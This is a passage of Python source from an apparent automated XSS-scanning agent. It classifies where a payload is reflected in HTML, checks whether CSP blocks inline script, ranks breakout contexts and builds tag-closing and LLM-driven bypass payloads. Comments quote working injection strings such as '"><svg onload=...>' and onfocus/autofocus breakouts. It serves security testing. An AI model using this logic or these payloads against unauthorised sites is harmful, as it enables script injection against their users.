        return []  # no <script> anywhere: nothing to tokenize the document for
    regions, _starts, inert, _fs = _html_index(html, len(html), False)
    return [(html[r[_R_START]:r[_R_END]], r[_R_START]) for r in regions
            if r[_R_KIND] == "rawtext" and r[_R_TAG] == "script"
            and r[_R_ATTR] in _JS_SCRIPT_TYPES
            and not _in_inert_subtree(inert, r[_R_START], r[_R_END])]


# PURE
def _reflected_forms(payload: str) -> Tuple[str, ...]:
    """The payload plus the shapes a server rewrites it into on the way back.

    Only transformations that ADD escaping — the point is to still find the reflection
    when the response no longer contains the payload verbatim. Whether the rewritten form
    still executes is then decided by the lexer, never by the shape itself.
    """
    forms = [payload]
    if "\\" in payload:
        forms.append(payload.replace("\\", "\\\\"))  # server doubles backslashes
    for sequence in ("\\'", '\\"'):
        if sequence in payload:
            tail = payload.split(sequence, 1)[1]
            if tail:
                forms.append(sequence[1] + tail)  # the backslash was consumed, quote is free
    return tuple(dict.fromkeys(forms))


# PURE
def _find_appropriate_end_tag(lower_html: str, start: int, tag: str) -> int:
    """Offset of the '</tag' that ends a raw-text element (len when never closed).

    HTML "appropriate end tag" rule: '</scriptx' does NOT close a <script>; the name has
    to be followed by whitespace, '/' or '>'.
    """
    needle = "</" + tag
    at = lower_html.find(needle, start)
    while at != -1:
        after = lower_html[at + len(needle): at + len(needle) + 1]
        if after == "" or after in _HTML_SPACE or after in (">", "/"):
            return at
        at = lower_html.find(needle, at + 1)
    return len(lower_html)


# PURE
@lru_cache(maxsize=2)
def _html_index(
    html: str, limit: int, xml: bool
) -> Tuple[Tuple[_HtmlRegion, ...], Tuple[int, ...], Tuple[Tuple[int, int], ...], int]:
    """Regions plus their start offsets, so a bisect key is never rebuilt per occurrence.

    ONE cache for the whole tokenizer, and a deliberately tiny one. The response body
    holds the payload, so it differs on every probe and a large cache can never hit —
    all it can do is PIN every distinct page that was ever classified (hundreds of MB on
    a scan that touches multi-megabyte responses). Size 2 is exactly what the access
    pattern needs: the four confirmation checks run back-to-back over the same body, and
    consecutive non-reflecting probes share an identical body.

    The third and fourth elements are the inert-subtree span list (<template> contents)
    and the frameset offset.
    """
    regions, inert, frameset = _scan_html(html, limit, xml)
    regions = tuple(regions)
    return regions, tuple(map(_itemgetter(_R_START), regions)), tuple(inert), frameset


# PURE
def _in_inert_subtree(spans: Tuple[Tuple[int, int], ...], start: int, end: int) -> bool:
    """True when [start, end) is wholly inside one of the inert subtrees.

    A payload that runs PAST the span end wrote the `</template>` that closed it, so it is
    back in the live document — the same "the construct ends inside the payload" rule the
    comment and attribute-value breakouts use.
    """
    for span_start, span_end in spans:
        if span_start <= start and end <= span_end:
            return True
        if span_start > start:
            break  # spans are emitted in document order
    return False


# PURE
def _region_index_at(
    regions: Tuple[_HtmlRegion, ...], starts: Tuple[int, ...], pos: int, html: str
) -> int:
    """Index of the region describing the parse state the point at `pos` LANDED IN (-1: none).

    A region of one of _PAYLOAD_OPENED_KINDS that begins exactly at `pos` was opened by the
    payload's OWN first character (`<img ...` opens a tag, a stray quote closes the
    attribute value it sat in), so the enclosing state is the region before it — the state
    the server was in when it wrote the reflection, which is what "position" means here.
    Content regions (data / rawtext / attribute value) that begin at `pos` are NOT stepped
    over: those were opened by the server's own markup just before the injection point.

    The INDEX rather than the region itself, because the owning start tag is found by
    walking its neighbours (see _host_attribute_names) and re-deriving the index from a
    start offset is ambiguous: an empty attribute value (`value=""`) makes two regions
    begin at the same offset.

    `starts` is the precomputed list of region start offsets, so the lookup is O(log n)
    per occurrence instead of rebuilding the key list every time.
    """
    idx = bisect_right(starts, pos) - 1
    if idx < 0:
        return -1
    while (idx > 0 and regions[idx][_R_START] == pos
           and regions[idx][_R_KIND] in _PAYLOAD_OPENED_KINDS):
        idx -= 1
    region = regions[idx]
    # Stepping back can land on a construct that ENDED exactly at `pos`. It still owns the
    # position when the payload's own first character is what closed it (the quote that
    # terminates the attribute value it was injected into) — but a start tag the SERVER
    # closed with its own '>' hands the position straight back to content. `<p>PAYLOAD` is
    # a text position, not an attribute of the <p>; without this the whole "does the
    # payload get out of the tag" question gets asked about a tag it was never in.
    if (region[_R_END] == pos and region[_R_KIND] == "tag"
            and html[pos - 1:pos] == ">"):
        return -1
    return idx if region[_R_START] <= pos <= region[_R_END] else -1


# PURE
def _tag_name_runs(html: str, regions: Tuple[_HtmlRegion, ...], first: int) -> str:
    """Join the NAME runs of the start tag that opens at region `first`.

    _scan_tag emits a start tag as alternating name runs (kind "tag": the element name,
    the whitespace, the attribute names, the delimiters) and value runs (the two
    _ATTR_VALUE_KINDS). Keeping only the name runs is what makes a `class="tabindex"`
    unable to masquerade as the attribute — and the asymmetry is safe in the one
    direction that matters, because a spurious match answers "focusable", which fails
    OPEN.
    """
    tag = regions[first][_R_TAG]
    names = []
    at = first
    while at < len(regions):
        region = regions[at]
        if region[_R_TAG] != tag or region[_R_KIND] not in _IN_TAG_KINDS:
            break
        if region[_R_KIND] == "tag":
            names.append(html[region[_R_START]:region[_R_END]])
            if html[region[_R_END] - 1:region[_R_END]] == ">":
                break  # the tag is closed: everything after belongs to another element
        at += 1
    return "".join(names)


# PURE
def _host_attribute_names(
    html: str, regions: Tuple[_HtmlRegion, ...], idx: int, memo: Dict[int, str]
) -> str:
    """The ATTRIBUTE-NAME text of the start tag that owns region `idx` ("" when unknown).

    Whether an injected handler can fire is a property of the element the server wrote,
    and for the focus family that property lives in the element's ATTRIBUTES (`tabindex`,
    `contenteditable`, `href`, `controls`) rather than in its name.

    Attributes the PAYLOAD wrote are included by construction. The tokenizer read them as
    attributes of this element, which is exactly what the browser will do with them, so
    `" onfocus=... autofocus tabindex="0` focuses the <div> it broke into and keeps
    confirming.

    `memo` maps an already-resolved region index to its element's names and is what keeps
    this LINEAR. Without it the answer costs one walk per occurrence, which is quadratic
    on a response that reflects the payload thousands of times inside ONE tag — measured
    at 6.6 s for 3k reflections in a single start tag, i.e. the shape that took the whole
    scan down as the gospider JS-mining ReDoS. Every index the walk crosses is recorded,
    so the total work is bounded by the tag's own regions however many occurrences land
    in it.
    """
    if idx < 0 or regions[idx][_R_KIND] not in _IN_TAG_KINDS:
        return ""
    crossed = []
    at = idx
    while True:
        if at in memo:
            names = memo[at]
            break
        region = regions[at]
        if (region[_R_KIND] == "tag"
                and html[region[_R_START]:region[_R_START] + 1] == "<"):
            names = memo[at] = _tag_name_runs(html, regions, at)
            break
        crossed.append(at)
        prev = at - 1
        if (prev < 0 or regions[prev][_R_TAG] != region[_R_TAG]
                or regions[prev][_R_KIND] not in _IN_TAG_KINDS
                or regions[prev][_R_END] != region[_R_START]):
            names = ""  # the tag open is not in the map (scan limit / truncation)
            break
        at = prev
    for k in crossed:
        memo[k] = names
    return names


# PURE
def _classify_region(region: _HtmlRegion, html: str, start: int, end: int) -> str:
    """Label the parse context of ONE payload occurrence spanning [start, end)."""
    kind = region[_R_KIND]
    region_end = region[_R_END]
    if kind == "data":
        return "html_text"
    if kind == "cdata":
        # XML / foreign-content CDATA is CHARACTER DATA: markup inside it is not
        # tokenized, exactly like a raw-text element, and only "]]>" ends it.
        return "rawtext_breakout" if region_end < end else "rawtext_inert"
    if kind == "comment":
        # The region ends AT the terminator, so a payload that closes the comment itself
        # always runs past it — the same "the token ends inside the payload" rule used
        # for attribute values and JS strings.
        return "comment_breakout" if region_end < end else "comment_inert"
    if kind == "plaintext":
        return "rawtext_inert"  # nothing can close a <plaintext> element, ever
    if kind == "rcdata" or kind == "rawtext":
        if region_end < end:
            return "rawtext_breakout"  # the payload carries the appropriate end tag
        if region[_R_TAG] == "script" and region[_R_ATTR] in _JS_SCRIPT_TYPES:
            region_start = region[_R_START]
            body = html[region_start:region_end]
            s, e = start - region_start, end - region_start
            if not _js_span_escapes(body, s, e):
                return ("script_dom_sink" if _js_literal_reaches_html_sink(body, s, e)
                        else "script_js_inert")
            return ("script_js_breakout" if _js_breakout_parses(body, s, e)
                    else "script_js_syntax_error")
        return "rawtext_inert"
    if kind == "attr_value":
        if region_end < end:
            return "attribute_quoted_breakout"  # the payload carries the delimiter
        if region[_R_ATTR] == "srcdoc":
            # HTML standard: an <iframe srcdoc="..."> value is parsed as a whole HTML
            # document, so markup inside it executes without escaping the delimiter.
            return "attribute_quoted_breakout"
        return "attribute_quoted_inert"
    return "attribute_unquoted"  # tag / attribute name / unquoted value → parsed as markup


# PURE
def classify_reflection_positions(html: str, payload: str, xml: bool = False) -> List[str]:
    """Classify the HTML parse context of EVERY raw occurrence of `payload` in `html`.

    Pure string → data helper (no I/O, no agent state) backing the HTTP confirmation
    predicate. One label per occurrence, in document order:

      "html_text"                 text position — the payload's tags DO parse
      "attribute_unquoted"        inside a start tag (attribute name / unquoted value) —
                                  the payload is parsed as markup/attributes
      "attribute_quoted_breakout" inside a quoted attribute value the payload CAN escape
                                  (it carries the raw delimiter quote)
      "attribute_quoted_inert"    inside a quoted attribute value it cannot escape
      "rawtext_breakout"          inside an RCDATA/RAWTEXT element (title, textarea,
                                  script, ...) but the payload carries the close tag
      "rawtext_inert"             inside an RCDATA/RAWTEXT (or <plaintext>) element,
                                  no close tag
      "script_js_breakout"        inside an inline <script> and the payload escapes the
                                  JS token (string / template / regex / comment) it landed
                                  in — no markup needed, the JS engine runs it
      "script_js_inert"           inside an inline <script>, JS token NOT escaped
      "comment_breakout"          inside an HTML comment the payload closes
      "comment_inert"             inside an HTML comment it cannot close

      "template_inert"            inside a <template>'s contents, which are parsed into a
                                  separate document that is never rendered
      "frameset_inert"            in the part of a frameset document the parser drops
      "script_js_syntax_error"    the JS token WAS escaped, but the resulting inline
                                  script no longer compiles, so none of it runs

    A reflection that was HTML-entity-escaped (&lt; / &quot; / &#60;) or percent-encoded
    inside a URL attribute produces NO raw occurrence by construction, so the result is
    an empty list — there is nothing that could execute.
    """
    return [label for label, _tag, _tail, _host in _reflection_occurrences(html, payload, xml)]


# PURE
def _reflection_occurrences(
    html: str, payload: str, xml: bool = False
) -> List[Tuple[str, str, bool, str]]:
    """(position, owning element, tail-closes, host attribute names) per occurrence.

    The element name is what makes "the payload declared an event handler" answerable:
    whether that handler can ever fire is a property of the element the server wrote, not
    of the payload. Its ATTRIBUTE NAMES answer the rest of it — an element is a focusable
    area, and therefore reachable by `onfocus`, partly by name and partly by attribute.
    `tail-closes` is whether a '>' exists in the response AFTER the occurrence, which is
    what decides whether a tag the payload opened is ever closed.
    """
    if not html or not payload or payload not in html:
        return []  # cheap early-out: most bombed payloads never reflect at all
    width = len(payload)
    # Nothing past the LAST occurrence can change a single label, so the tokenizer is
    # told where to stop. On the common shape — a search term echoed near the top of a
    # long listing page — that is most of the document not scanned at all.
    regions, starts, inert, frameset = _html_index(
        html, html.rfind(payload) + width, xml)
    out: List[Tuple[str, str, bool, str]] = []
    # Resolved region index -> owning start tag's attribute names, shared across every
    # occurrence so a page that reflects the payload once per attribute of one huge tag
    # costs one walk over that tag, not one per occurrence.
    hosts: Dict[int, str] = {}
    at = html.find(payload)
    while at != -1:
        end = at + width
        tail = html.find(">", end) != -1
        if inert and _in_inert_subtree(inert, at, end):
            out.append(("template_inert", "", tail, ""))
            at = html.find(payload, at + 1)
            continue
        # A reflection at offset 0 begins where the tokenizer is unambiguously in DATA
        # state — there is nothing before it to have changed that. Resolving a region AT
        # offset 0 instead finds the tag the PAYLOAD ITSELF opened and reads the payload
        # as sitting inside its own attribute, so `<svg onload=alert(1)>` returned as the
        # whole body scored `attribute_unquoted` and was dropped. That also killed the
        # <iframe srcdoc> rescue, whose decoded value IS the payload and nothing else.
        idx = _region_index_at(regions, starts, at, html) if at else -1
        # No region means the tokenizer never reached this offset: unknown state, so fail
        # OPEN and call it a text position rather than silently dropping the reflection.
        region = regions[idx] if idx >= 0 else None
        label = _classify_region(region, html, at, end) if region is not None else "html_text"
        # In a frameset document the tree builder throws away every character token after
        # the <frameset>; the <frame> elements' own attributes still work, so only the
        # TEXT positions are dropped.
        if frameset >= 0 and at >= frameset and label in _TEXT_REFLECTION_POSITIONS:
            label = "frameset_inert"
        out.append((label, region[_R_TAG] if region is not None else "", tail,
                    _host_attribute_names(html, regions, idx, hosts)))
        at = html.find(payload, at + 1)
    return out


# =============================================================================
# REFLECTION CONTEXT RANKING + CONTEXT-AWARE BREAKOUTS (PURE)
# =============================================================================
# (element, attribute) pairs whose processing model is NAVIGATE. A `javascript:` URL is
# only ever evaluated by the navigate algorithm; every other URL attribute FETCHES its
# URL, and a javascript: fetch fails silently. That is the whole difference between
# <a href="javascript:…"> (runs) and <img src="javascript:…"> / <object data=…> /
# <video poster=…> / <blockquote cite=…> / <link href=…> (measurably inert in Chromium).
# The pair — not the bare attribute name — is what decides it, so `src` on an <iframe>
# navigates while `src` on an <img> does not.
_NAVIGATING_URL_ATTRIBUTES = frozenset({
    ("a", "href"), ("a", "xlink:href"),
    ("area", "href"), ("area", "xlink:href"),
    ("form", "action"),
    ("button", "formaction"), ("input", "formaction"),
    ("iframe", "src"), ("frame", "src"),
})

# URL standard, "basic URL parser": every ASCII tab and newline is removed from the input
# before it is parsed, so `java&#09;script:` is the javascript: scheme.
_URL_TAB_STRIP = {0x09: None, 0x0A: None, 0x0D: None}

# Response media types a browser parses as a SCRIPTABLE document. Everything else is
# rendered as data, so a reflection in it cannot execute. SVG belongs here: navigating to
# an image/svg+xml response runs its scripts, and suppressing it would drop a real finding.
_EXECUTABLE_CONTENT_TYPES = frozenset({
    "text/html", "application/xhtml+xml", "image/svg+xml",
})

# The subset of those that a browser hands to an XML parser rather than the HTML parser.
_XML_CONTENT_TYPES = frozenset({"application/xhtml+xml", "image/svg+xml"})

# =============================================================================
# CONTENT SECURITY POLICY (PURE)
# =============================================================================
# Every payload this agent ships is INLINE — an inline <script>, an on<event> attribute or
# a javascript: URL. CSP Level 3 governs all three through the same fallback chains, so a
# policy that forbids inline script makes the reflection unexploitable by anything we can
# send, and Chromium refuses to run it. Only the ENFORCING header counts:
# Content-Security-Policy-Report-Only blocks nothing by definition.
#
# The two chains are evaluated SEPARATELY and the answer is their AND, so the gate only
# goes quiet when the policy blocks BOTH the element and the attribute vector. Anything we
# cannot parse leaves the policy silent, which means "not blocked" — fail OPEN, as
# everywhere else in this file.
_CSP_INLINE_CHAINS = (
    ("script-src-elem", "script-src", "default-src"),   # injected <script> elements
    ("script-src-attr", "script-src", "default-src"),   # injected on<event> / javascript:
)
_CSP_HASH_PREFIXES = ("'nonce-", "'sha256-", "'sha384-", "'sha512-")
# Cheap C-level pre-filter for the in-document policy: no http-equiv, no meta CSP.
_META_HTTP_EQUIV_RE = re.compile(r"http-equiv", re.IGNORECASE)
# Attribute-name marker for the `content` of a CSP <meta>, so the policy can be recovered
# from the region map without a second parse of the document.
_META_CSP_ATTR = "content" + _ELEMENT_STATE_SEP + "csp"


# PURE
def _csp_chain_blocks(directives: Dict[str, List[str]], chain: Tuple[str, ...]) -> bool:
    """True when the first directive of `chain` that is present forbids inline script."""
    for name in chain:
        sources = directives.get(name)
        if sources is None:
            continue
        if "'unsafe-inline'" not in sources:
            return True
        # CSP3: a nonce or hash source expression makes 'unsafe-inline' INERT for script,
        # and an injected inline script can never carry the right nonce.
        return any(s.startswith(_CSP_HASH_PREFIXES) for s in sources)
    return False  # nothing in this policy governs script


# PURE
@lru_cache(maxsize=8)
def _csp_blocks_inline(policy: str) -> bool:
    """True when `policy` (one or more comma-separated policies) forbids inline script."""
    if not policy or not policy.strip():
        return False
    try:
        for one in policy.split(","):
            directives: Dict[str, List[str]] = {}
            for serialized in one.split(";"):
                parts = serialized.split()
                if parts and parts[0].lower() not in directives:
                    directives[parts[0].lower()] = [p.lower() for p in parts[1:]]
            if all(_csp_chain_blocks(directives, chain) for chain in _CSP_INLINE_CHAINS):
                return True
    except Exception:  # unparseable policy → fail OPEN
        return False
    return False


# PURE
def _document_csp(html: str) -> str:
    """The policies the DOCUMENT declares via <meta http-equiv="Content-Security-Policy">.

    Equally enforcing as the header (a meta policy cannot be report-only), and the one a
    static page can carry without any server configuration at all.
    """
    if not html or _META_HTTP_EQUIV_RE.search(html) is None:
        return ""
    regions, _starts, _inert, _fs = _html_index(html, len(html), False)
    return ",".join(
        html_module.unescape(html[r[_R_START]:r[_R_END]])
        for r in regions if r[_R_ATTR] == _META_CSP_ATTR)


# Every module-level memo whose KEY is a response body (or a span of one). Each entry
# therefore pins whole documents alive for as long as the process lives, and the API
# runs as a long-lived FastAPI worker across many scans — so without an explicit release
# the last documents of every scan ever run stay resident forever.
#
# Registered here rather than cleared one-by-one at the call site so that adding a cache
# cannot silently reintroduce the leak: the release walks THIS tuple.
_DOCUMENT_CACHES = (
    _js_tokens,
    _js_index,
    _attribute_candidates,
    _html_index,
    _csp_blocks_inline,
)


def release_document_caches() -> Dict[str, int]:
    """Drop every cached response body. Returns each cache's size before clearing.

    Call at PIPELINE EXIT ONLY. These memos are what make the confirmation rungs cheap —
    the four checks run back-to-back over one body, and consecutive non-reflecting probes
    share an identical body — so clearing mid-scan would re-parse documents the scan is
    still working on. At exit there is nothing left to hit, and the entries are pure
    retention.

    Purely a memory operation: an lru_cache is semantically transparent, so clearing it
    can change timing but never a verdict.
    """
    sizes = {fn.__name__: fn.cache_info().currsize for fn in _DOCUMENT_CACHES}
    for fn in _DOCUMENT_CACHES:
        fn.cache_clear()
    return sizes


# Most-exploitable-first ranking, used to pick ONE label when a parameter reflects in
# several places at once (very common: a search term echoed into <title>, into an
# <input value="..."> AND into the page body). Returning the first hit — as the previous
# implementation did — hid the exploitable reflection behind an inert one.
_CONTEXT_EXPLOITABILITY = (
    "script",           # JS execution context
    "event_handler",    # attribute value that IS JavaScript
    "html_text",        # tags parse here
    "attribute_value",  # needs a quote breakout
    "style",            # CSS context
    "comment",
    "tag_name",
    "url_context",      # browser-only (click / navigation)
    "raw_text",         # RCDATA/RAWTEXT — needs the matching close tag
)

# Contexts `_is_payload_relevant()` has a filtering rule for. Any other label falls back
# to the broad payload set instead of the 10-payload safety net: never cut recall on a
# context we simply have no rule for.
_FILTERABLE_CONTEXTS = frozenset({
    "script", "html_text", "attribute_value", "comment", "style", "tag_name",
})

# DASTySAST measures the reflection context during triage, but names it in an OLDER
# vocabulary than the one ranked above. Translating ON ARRIVAL keeps a single canonical
# name set instead of teaching every consumer both dialects.
_PROBE_CONTEXT_ALIASES = {
    "script_block": "script",
    "html_attribute": "attribute_value",
}


# PURE
def canonical_probe_context(label: str) -> str:
    """A DASTySAST probe label in THIS agent's vocabulary, or "" if it carries no measurement.

    "" for no_reflection / error / response_header and for anything unrecognised. An
    unmapped label must never be passed through: it would match no branch in the ladder
    and behave exactly like the "html" placeholder it exists to replace — a wrong label
    that looks like information is worse than an honest absence.
    """
    label = (label or "").strip().lower()
    if label in _CONTEXT_EXPLOITABILITY:
        return label
    return _PROBE_CONTEXT_ALIASES.get(label, "")

# Map this agent's reflection-context vocabulary onto the shared ReflectionContext table
# so breakout prefixes keep ONE definition (tools/manipulator/context_analyzer).
#
# FIVE independent label vocabularies reach the breakout helpers below:
#   reflection analyser  : script, style, html_text, raw_text, attribute_value,
#                          event_handler, url_context, comment, tag_name, unknown, blocked
#   HTML position class. : rawtext_inert, rawtext_breakout, attribute_quoted_inert,
#                          attribute_quoted_breakout, attribute_unquoted, comment_inert, ...
#   LLM / DRY dedup      : html_body, attribute, javascript, url, css
#   execution evidence   : html_tag, event_handler, javascript_uri, script_block,
#                          template_expression, js_string_breakout
#   whatever an LLM invents, because the DRY label is model output, not a closed set.
# Matching is therefore done on the label's WORD TOKENS (universal parse-state names), not
# on the label as a whole, so "attribute_quoted_inert", "script_block" and
# "js-template-literal" all resolve without being enumerated anywhere.
_CONTEXT_TOKEN_KEYS = {
    # JavaScript execution / JS string literals
    "script": (ReflectionContext.SCRIPT_TAG, ReflectionContext.JAVASCRIPT_STRING_SINGLE,
               ReflectionContext.JAVASCRIPT_STRING_DOUBLE, ReflectionContext.JAVASCRIPT_TEMPLATE),
    "javascript": (ReflectionContext.SCRIPT_TAG, ReflectionContext.JAVASCRIPT_STRING_SINGLE,
                   ReflectionContext.JAVASCRIPT_STRING_DOUBLE, ReflectionContext.JAVASCRIPT_TEMPLATE),
    "js": (ReflectionContext.SCRIPT_TAG, ReflectionContext.JAVASCRIPT_STRING_SINGLE,
           ReflectionContext.JAVASCRIPT_STRING_DOUBLE, ReflectionContext.JAVASCRIPT_TEMPLATE),
    "string": (ReflectionContext.JAVASCRIPT_STRING_SINGLE, ReflectionContext.JAVASCRIPT_STRING_DOUBLE),
    "literal": (ReflectionContext.JAVASCRIPT_STRING_SINGLE, ReflectionContext.JAVASCRIPT_STRING_DOUBLE),
    # HTML attribute values (an event handler IS an attribute value that holds JS)
    "attribute": (ReflectionContext.HTML_ATTRIBUTE_DOUBLE, ReflectionContext.HTML_ATTRIBUTE_SINGLE),
    "attr": (ReflectionContext.HTML_ATTRIBUTE_DOUBLE, ReflectionContext.HTML_ATTRIBUTE_SINGLE),
    "event": (ReflectionContext.HTML_ATTRIBUTE_DOUBLE, ReflectionContext.HTML_ATTRIBUTE_SINGLE,
              ReflectionContext.JAVASCRIPT_STRING_SINGLE, ReflectionContext.JAVASCRIPT_STRING_DOUBLE),
    "handler": (ReflectionContext.HTML_ATTRIBUTE_DOUBLE, ReflectionContext.HTML_ATTRIBUTE_SINGLE,
                ReflectionContext.JAVASCRIPT_STRING_SINGLE, ReflectionContext.JAVASCRIPT_STRING_DOUBLE),
    # Document body / any position parsed as markup
    "body": (ReflectionContext.HTML_TAG_BODY,),
    "text": (ReflectionContext.HTML_TAG_BODY,),
    "rawtext": (ReflectionContext.HTML_TAG_BODY,),
    "rcdata": (ReflectionContext.HTML_TAG_BODY,),
    "tag": (ReflectionContext.HTML_TAG_BODY,),
    "html": (ReflectionContext.HTML_TAG_BODY,),
    "markup": (ReflectionContext.HTML_TAG_BODY,),
    "dom": (ReflectionContext.HTML_TAG_BODY,),
    "element": (ReflectionContext.HTML_TAG_BODY,),
    # URL-bearing attribute values
    "url": (ReflectionContext.URL_PARAMETER,),
    "uri": (ReflectionContext.URL_PARAMETER,),
    "href": (ReflectionContext.URL_PARAMETER,),
    "src": (ReflectionContext.URL_PARAMETER,),
    "link": (ReflectionContext.URL_PARAMETER,),
    "location": (ReflectionContext.URL_PARAMETER,),
    "redirect": (ReflectionContext.URL_PARAMETER,),
    # Remaining parse states
    "comment": (ReflectionContext.HTML_COMMENT,),
    "style": (ReflectionContext.STYLE_TAG,),
    "css": (ReflectionContext.STYLE_TAG,),
    "json": (ReflectionContext.JSON_STRING,),
    "template": (ReflectionContext.TEMPLATE_ENGINE, ReflectionContext.JAVASCRIPT_TEMPLATE),
    "interpolation": (ReflectionContext.TEMPLATE_ENGINE,),
    "mustache": (ReflectionContext.TEMPLATE_ENGINE,),
}

# The SAFE SUPERSET every label gets, matched tokens or not: body + both attribute
# families cover the common reflection shapes without assuming anything about the target.
# INVARIANT: an unrecognised (or plain wrong) context label must NEVER mean "fire fewer
# payloads" — it is only ever allowed to mean "fire the broad set". Keep it that way.
_CONTEXT_FALLBACK_KEYS = (
    ReflectionContext.HTML_TAG_BODY,
    ReflectionContext.HTML_ATTRIBUTE_DOUBLE,
    ReflectionContext.HTML_ATTRIBUTE_SINGLE,
)

# Emission order of the matched keys: most context-specific / most likely to execute
# first, so that a downstream slice keeps the highest-value prefixes.
_CONTEXT_KEY_ORDER = (
    ReflectionContext.SCRIPT_TAG,
    ReflectionContext.JAVASCRIPT_STRING_SINGLE,
    ReflectionContext.JAVASCRIPT_STRING_DOUBLE,
    ReflectionContext.JAVASCRIPT_TEMPLATE,
    ReflectionContext.HTML_ATTRIBUTE_DOUBLE,
    ReflectionContext.HTML_ATTRIBUTE_SINGLE,
    ReflectionContext.HTML_TAG_BODY,
    ReflectionContext.HTML_COMMENT,
    ReflectionContext.STYLE_TAG,
    ReflectionContext.TEMPLATE_ENGINE,
    ReflectionContext.JSON_STRING,
    ReflectionContext.URL_PARAMETER,
)

# Explicit L3 request budget for the CONTEXT-specific prefixes. L3 fires
# (1 + len(prefixes)) requests per LLM payload and _ask_deepseek_visual_payloads() returns
# at most 10, so the merged list sets L3's cost directly: 10 x (1 + N). The globally
# ranked prefixes are never counted against this budget — dropping one of those is a
# straight capability loss (see merge_breakout_prefixes). 56 sits above the longest union
# the shared CONTEXT_BREAKOUTS table can produce for any label today (measured worst case
# 50, typical 21-40), so it currently truncates nothing and no prefix that ever fired can
# be lost to it. It is a GUARD: growing that shared table cannot silently multiply L3
# traffic without someone raising this number on purpose.
_L3_CONTEXT_PREFIX_BUDGET = 56


# PURE
def most_exploitable_context(contexts: List[str]) -> str:
    """Pick the most exploitable label out of every context a probe reflected in."""
    for label in _CONTEXT_EXPLOITABILITY:
        if label in contexts:
            return label
    for label in contexts:
        if label:
            return label
    return "unknown"


# PURE
def _dedup_prefixes(prefixes: List[str]) -> List[str]:
    """Order-preserving dedup that drops empty/whitespace-only prefixes.

    prefix+payload == payload for an empty prefix, so those only burn requests.
    """
    seen: set = set()
    out: List[str] = []
    for prefix in prefixes or ():
        if not prefix or not prefix.strip() or prefix in seen:
            continue
        seen.add(prefix)
        out.append(prefix)
    return out


# PURE
def context_reflection_keys(context: str) -> Tuple[ReflectionContext, ...]:
    """Normalise ANY context label onto the shared ReflectionContext table.

    ONE mapping for every label vocabulary that can reach the breakout helpers (see
    _CONTEXT_TOKEN_KEYS). The label is split into word tokens and every token that names a
    parse state contributes its keys; the SAFE SUPERSET (_CONTEXT_FALLBACK_KEYS) is then
    appended unconditionally.

    INVARIANT — an unrecognised label degrades to a SUPERSET, never to a smaller set. A
    label from the "wrong" vocabulary (an LLM-invented DRY label, a position-classifier
    label) must never silently reduce what gets fired: fail OPEN on uncertainty.
    """
    tokens = set(re.split(r"[^a-z0-9]+", (context or "").lower()))
    matched = {
        key
        for token in tokens
        for key in _CONTEXT_TOKEN_KEYS.get(token, ())
    }
    ordered = tuple(k for k in _CONTEXT_KEY_ORDER if k in matched)
    return ordered + tuple(k for k in _CONTEXT_FALLBACK_KEYS if k not in matched)


# PURE
def context_breakout_prefixes(context: str, surviving_chars: str = "") -> List[str]:
    """Breakout prefixes the shared context table prescribes for a reflection context.

    `surviving_chars` (from the L0.5 character probe) only narrows the attribute families:
    if the response proves the double quote survives we keep the '"' family (which is
    where the '">' tag-closing breakout lives) and drop the single-quote one, and vice
    versa. Empty `surviving_chars` means "unknown" → keep both. It deliberately does NOT
    narrow the JS-string families: those breakouts (\\' , \\") exist precisely for the
    server that escapes the raw quote away.
    """
    prefixes: List[str] = []
    for key in context_reflection_keys(context):
        if surviving_chars:
            if key is ReflectionContext.HTML_ATTRIBUTE_DOUBLE and '"' not in surviving_chars:
                continue
            if key is ReflectionContext.HTML_ATTRIBUTE_SINGLE and "'" not in surviving_chars:
                continue
        prefixes.extend(ContextAnalyzer.CONTEXT_BREAKOUTS.get(key, []))
    return _dedup_prefixes(prefixes)


# PURE
def merge_breakout_prefixes(
    context_prefixes: List[str], global_prefixes: List[str],
    context_budget: int = _L3_CONTEXT_PREFIX_BUDGET,
) -> List[str]:
    """Union context-appropriate breakouts with the globally-ranked ones. ADDITIVE.

    The global ranking is sorted by success_count ALONE (no context, no surviving-chars
    filter), so a breakout that actually fits the detected context can fall outside its
    limit and never be tried — that is why the context list is unioned in. But capping the
    UNION is just as damaging in the other direction: the context list eats the whole cap
    and globally ranked prefixes that used to fire fall off the end (the JS-string
    breakouts \\' and \\'; , the CSTI one {{ ...). So EVERY global prefix is kept, and the
    bound applies only to the context contribution.

    The two rankings are then interleaved, context first (it carries the stronger,
    response-derived evidence), so that ANY downstream slice keeps the head of BOTH.
    """
    ctx = _dedup_prefixes(context_prefixes)[:max(0, context_budget)]
    glob = _dedup_prefixes(global_prefixes)
    merged: List[str] = []
    seen: set = set()
    for i in range(max(len(ctx), len(glob))):
        for source in (ctx, glob):
            if i < len(source) and source[i] not in seen:
                seen.add(source[i])
                merged.append(source[i])
    return merged


# PURE
def tag_closing_breakout_payloads(
    context: str, surviving_chars: str, smart_payloads: Dict[str, str]
) -> List[str]:
    """Deterministic tag-closing candidates — emitted for EVERY context label.

    L3 only ever fires LLM payloads multiplied by breakout prefixes, so when the LLM does
    not propose a tag-closing payload AND the '">' prefix falls outside the global
    ranking cut, the whole '"><svg onload=...>' family is unreachable. These candidates
    make it reachable. They keep the silent document.title probe convention so the
    report-time upgrade (reporting_mod.finding_processor.upgrade_payload) still
    recognises them and swaps in the visual banner PoC.

    INVARIANT — the context LABEL must never subtract. `context` reaches here from any of
    the vocabularies listed on _CONTEXT_TOKEN_KEYS, so allow-listing labels meant an
    unrecognised one yielded ZERO payloads, i.e. silently disabled the very fix this
    function is. It is only ever read to ADD (a script-context label also gets the
    </script> close-tag breakout, the RAWTEXT equivalent of '">'). The only subtraction is
    `surviving_chars`, which is MEASURED from the response, not guessed from a label: a
    quote the server provably encodes cannot close the tag. Unknown ⇒ fire everything.
    """
    keys = []
    if not surviving_chars or '"' in surviving_chars:
        keys.append("attr_dq_tag_breakout")
    if not surviving_chars or "'" in surviving_chars:
        keys.append("attr_sq_tag_breakout")
    if ReflectionContext.SCRIPT_TAG in context_reflection_keys(context):
        if not surviving_chars or "<" in surviving_chars:
            keys.append("script_breakout")
    return [p for p in (smart_payloads.get(k, "") for k in keys) if p]


from bugtrace.agents.base import BaseAgent

class XSSAgent(BaseAgent, TechContextMixin):
    """
    LLM-Driven XSS Agent with multi-layer validation.

    Flow:
    1. Register with Interactsh (get callback URL)
    2. Probe target to get HTML with reflection
    3. LLM analyzes HTML and generates optimal payload
    4. Send payload to target
    5. Validate via Interactsh (primary) or Vision/CDP (fallback)
    6. If failed, LLM generates bypass, repeat

